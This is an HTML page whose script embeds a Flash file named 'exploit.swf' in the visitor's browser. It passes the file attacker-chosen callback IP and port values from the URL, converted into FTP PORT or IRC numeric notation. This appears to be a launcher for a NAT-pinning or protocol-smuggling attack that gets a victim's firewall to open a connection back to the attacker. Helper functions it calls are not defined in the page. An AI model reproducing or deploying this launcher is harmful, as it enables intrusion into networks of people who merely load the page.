<body>

		<script>
		var createSwfObject = function(src, attributes, parameters) {
  			var i, html, div, obj, attr = attributes || {}, param = parameters || {};
  			attr.type = 'application/x-shockwave-flash';
  			if (window.ActiveXObject) {
    				attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
    				param.movie = src;
  			}
  			else {
    				attr.data = src;
  			}
			html = '<object';
  				for (i in attr) {
   					html += ' ' + i + '="' + attr[i] + '"';
  				}
  			html += '>';
  			for (i in param) {
    				html += '<param name="' + i + '" value="' + param[i] + '" />';
  				}
  			html += '</object>';
  			div = document.createElement('div');
  			div.innerHTML = html;
  			obj = div.firstChild;
  			div.removeChild(obj);
  			return obj;
		}
		function tests(server,ip,thirdip){

		}

		var proto = getParameter("type").toUpperCase()
			if (proto==""){proto="FTP"}//defaulting to ftp
			var server = getParameter("server")
			if (server==""){server= document.location.hostname}//defaulting to same host

			var callbackip = null
				var callbackport = null
				if (proto=="IRC"){
					callbackip = dot2num(getParameter("ci"))
					callbackport = getParameter("cp")
				}
				if (proto=="FTP"){
					callbackip = getParameter("ci").replace(/\./g,",")
					callbackport = ftpCalcPortNotation(getParameter("cp"))
				}
				//where dragons be
				var swfEl = createSwfObject('exploit.swf', {id: 'myid', 'class': 'myclass', width: 100, height: 100}, {wmode: 'transparent', FlashVars : 'ci='+ callbackip + '&cp='+callbackport+'&server='+ server + '&type='+proto});
				document.body.appendChild(swfEl);
		</script>


</body>
